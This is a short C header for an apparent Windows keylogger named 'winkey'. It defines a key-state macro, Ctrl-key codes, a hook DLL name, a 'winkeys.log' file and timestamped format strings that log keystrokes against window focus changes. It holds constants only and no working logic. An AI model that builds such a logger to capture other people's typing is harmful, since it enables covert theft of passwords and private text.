#ifndef WINKEY_H
#define WINKEY_H

#include <windef.h>

#define IS_DOWN(vk_code) ((GetKeyState(vk_code) & 0x8000) ? 1 : 0)

typedef enum _CTRL_KEYS
{
    CTRL_BASE = 'A' - 1,
    CRTL_A    = 'A' - CTRL_BASE,  // Ctrl+A
    CRTL_C    = 'C' - CTRL_BASE,  // Ctrl+C
    CRTL_X    = 'X' - CTRL_BASE,  // Ctrl+X
    CRTL_V    = 'V' - CTRL_BASE,  // Ctrl+V
    CRTL_Z    = 'Z' - CTRL_BASE,  // Ctrl+Z
    CRTL_Y    = 'Y' - CTRL_BASE,  // Ctrl+Y
} CTRL_KEYS;

#define WINKEY_CHAR_WSTR                                                       \
    TEXT("WINKEY_CHAR{31AAF778-3ABA-476C-92C6-DB293FAA4411}")
#define HOOK_DLL_FILENAME_WSTR TEXT("Hook.dll")
#define WINKEY_LOG_FILENAME_TEXT TEXT("winkeys.log")

#define WINKEY_LOG_KBD_FOCUS_CHANGE_FORMAT                                     \
    TEXT("\r\n[%4d-%02d-%02d %02d:%02d:%02d] - \"%ls\"\r\n")

#define WINKEY_LOG_KBD_FOCUS_CHANGE_FORMAT_NOPREV_INPUT                        \
    TEXT("[%4d-%02d-%02d %02d:%02d:%02d] - \"%ls\"\r\n")

#define NSIZE(x) (sizeof(x) / sizeof(x[0]))

#endif